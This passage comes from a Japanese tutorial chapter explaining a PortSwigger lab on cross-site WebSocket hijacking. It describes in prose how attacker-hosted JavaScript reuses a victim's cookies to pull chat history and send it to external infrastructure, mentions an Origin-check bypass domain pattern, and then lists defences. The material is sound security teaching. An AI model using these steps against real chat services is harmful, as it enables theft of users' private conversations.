1. 攻撃者は、被害者のブラウザ上で実行されることを狙ったJavaScriptを用意する。このJavaScriptは、脆弱なチャットサーバーへWebSocket接続を開始し、接続確立後に`READY`相当のメッセージを送信し、サーバーから返ってきたチャット履歴を受信するイベントハンドラを持つ。
2. このJavaScriptを、PortSwiggerのexploit server（＝攻撃者が管理する別オリジンを模したサーバー）上にホストする。
3. 被害者（ラボ内ではシミュレートされたユーザー/管理者ボット）が、ログイン済みの状態でこのページを閲覧すると、ブラウザは自動的にセッションCookieを付与してWebSocketハンドシェイクを送信する。
4. 脆弱なサーバーは`Origin`ヘッダーを検証しないため接続を受け入れ、`READY`メッセージに応じてチャット履歴を返す。
5. 攻撃者のJavaScriptは受信したチャット履歴を、攻撃者が観測可能な別のチャネル（ラボではBurp Collaboratorのような外部インフラ、あるいはexploit serverへのログ送信）へ転送し、攻撃者がそれを読み取る。

このように、被害者が「何かをクリックする」といった能動的な操作を必要とせず、悪意あるページを単に開くだけで攻撃が成立し得る点も、CSWSHがCSRFと近い性質（被害者のブラウザの権限を借用する間接攻撃）を持ちながら、リアルタイム・双方向という性質ゆえにより多くのデータを継続的に窃取しうる点でCSRFより影響が大きくなり得ることを示している。

### 防御の要点（このラボが教える教訓）

このラボから導かれる防御上の教訓は、本章の他節とも重なるが、実習の文脈で改めて整理すると以下の通りである。

- **WebSocketハンドシェイク時に`Origin`ヘッダーを必ずサーバー側で検証する。** 許可リスト方式（自ドメイン、および明示的に許可した信頼できるドメインのみ）を用い、ワイルドカードや前方一致・部分一致による緩い検証（例えば`example.com`を含むかどうかだけを見る実装は`evil-example.com.attacker.com`のようなペイロードで回避されうる）を避ける。
- **WebSocket接続にもCSRF対策を組み込む。** Cookieのみに依存せず、接続確立時にサーバーが発行した推測不可能なトークンを要求する、あるいはハンドシェイク前に別途認証済みのワンタイムトークンをHTTPで取得させ、それをWebSocket接続時のパラメータとして要求するといった設計が有効である。
- **セッションCookieに`SameSite=Strict`または`Lax`を設定する。** WebSocketハンドシェイクもブラウザが自動でCookieを付与する通常のHTTPリクエストとして扱われるため、`SameSite`属性が正しく設定されていれば、クロスサイトなハンドシェイクにCookieが付与されなくなり、認証情報自体が攻撃者のオリジンから送られたリクエストに乗らなくなる。ただし`SameSite`だけに依存するのはブラウザ実装やレガシー環境への配慮から推奨されず、Origin検証との多層防御が望ましい。
- **機密性の高い操作・データ取得を伴うWebSocketメッセージ（本ラボの`READY`のような履歴一括取得コマンド）ほど、接続確立時の認証・認可の厳密さが重要になる。** 「接続できた＝認証されたユーザーである」という前提だけに頼らず、メッセージ単位でも追加の検証を検討する設計が堅牢である。

### まとめ

本ラボは、CSWSHという概念を「WebSocketハンドシェイクがCookie認証を引き継ぐ」「Origin検証はCORSのpreflightのように自動では効かず、サーバーの実装責任である」という二つの仕組みレベルの理解に落とし込むために設計された実習である。攻略手順そのものよりも、なぜチャット機能の設計——Cookie依存の認証、Origin未検証、CSRFトークン欠如——がこの脆弱性を生むのかという構造を理解することが、実務でのコードレビューや脆弱性診断において再現性のある知識になる。実際の攻略操作は、PortSwiggerが提供する自分専用のラボインスタンス上で、公式サイトの案内に従って行うこと。

> 出典: Cross-site WebSocket hijacking — https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab


---

[📖 目次](index.md) ・ [← 第6章 前提: WebSocketの仕組み](06-websocket-fundamentals.md) ・ [第8章 WebSocketの他の脆弱性 →](08-websocket-other-vulns.md)
